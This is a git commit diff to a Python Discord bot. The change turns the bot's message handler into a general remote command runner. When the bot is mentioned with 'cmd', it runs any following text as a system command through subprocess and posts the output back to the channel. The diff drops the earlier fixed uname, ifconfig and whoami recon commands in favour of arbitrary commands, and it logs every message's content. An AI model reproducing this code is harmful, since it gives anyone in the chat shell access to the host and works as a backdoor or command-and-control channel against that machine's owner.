5e22b695ea3ef3b57382fe3a0693a046b6e0d86d
Ahmed Saeed <ahmedsaeedramadan@yahoo.com>
2022-05-16 00:16:46 +0200

    Update discordbot.py

--- discordbot.py
+++ discordbot.py
@@ -10,24 +10,18 @@ async def on_ready():
 
 @bot.event
 async def on_message(message):
+        print(message.content)
         if str(bot.user.id) in message.content:
                 print('bot is mentioned')
                 cmd = message.content.split()
-                print(cmd[1])
                 await message.channel.send("thanks for the mention bro")
-                if cmd[1] == "hello":
-                        await message.channel.send("hey we will do good work together")
-                if cmd[1] == "uname":
-                        cmdcall = subprocess.run(["uname", "-a"], stdout=subprocess.PIPE, text=True)
-                        await message.channel.send(cmdcall.stdout)
-                if cmd[1] == "ifconfig":
-                        cmdcall = subprocess.run(["ifconfig"], stdout=subprocess.PIPE, text=True)
-                        await message.channel.send(cmdcall.stdout)
-                if cmd[1] == "whoami":
-                        cmdcall = subprocess.run(["whoami"], stdout=subprocess.PIPE, text=True)
-                        await message.channel.send(cmdcall.stdout)
                 if cmd[1] == "cmd":
-                        cmdcall = subprocess.run([cmd[2]], stdout=subprocess.PIPE, text=True)
+                        command = []
+                        for i in range(len(cmd)):
+                                if i > 1:
+                                        command.append(cmd[i])
+                        print(command)
+                        cmdcall = subprocess.run(command, stdout=subprocess.PIPE, text=True)
                         await message.channel.send(cmdcall.stdout)
 
 bot.run(token)
